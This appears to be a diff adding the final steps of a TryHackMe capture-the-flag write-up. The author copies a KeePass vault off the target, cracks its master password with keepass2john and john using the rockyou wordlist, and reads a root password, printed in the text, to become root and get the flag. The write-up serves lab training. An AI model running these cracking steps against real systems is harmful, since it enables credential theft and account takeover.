@@ -136,4 +136,41 @@ Check scheduled tasks
 Look for any backup scripts laying around 
 
 I go to check this file /home/sysadmin/backups/ where I find a read me file and a infrastructure.kdbx file 
+A KeePass database (.kdbx) holding “infrastructure credentials”
+There was no keyfile alongside it, so it was master-password protected only.
 
+Cracking the KeePass master password
+I exfiltrated the database to my attack box (served it over HTTP from the target, pulled it with wget),
+then extracted and cracked the hash:
+
+keepass2john infrastructure.kdbx > kdbx.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash
+john --show kdbx.hash
+
+Once I had the master password it was time to loot the vault 
+
+keepassxc-cli open infrastructure.kdbx     # password: spring
+backup> ls
+
+Here are the results:
+Root User Password - Sensitive
+General/ 
+Windows/ 
+Network/  
+Internet/  
+eMail/  
+Homebanking/
+
+I managed to get the password 
+Title:    Root User Password - Sensitive
+UserName: root
+Password: S3cur3P4ss0nK33p4ss
+Notes:    root user password, remember to change later.
+
+I could not ssh directly into root as PermitRootLogin is restricted by defualt 
+So back on the sysadmin shell I was able to su into root using the password that was discovered 
+
+Once I succesfully logged into root all I needed to do was exfiltrate the flag 
+cat /root/root.txt
+THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}
+Last flag found!
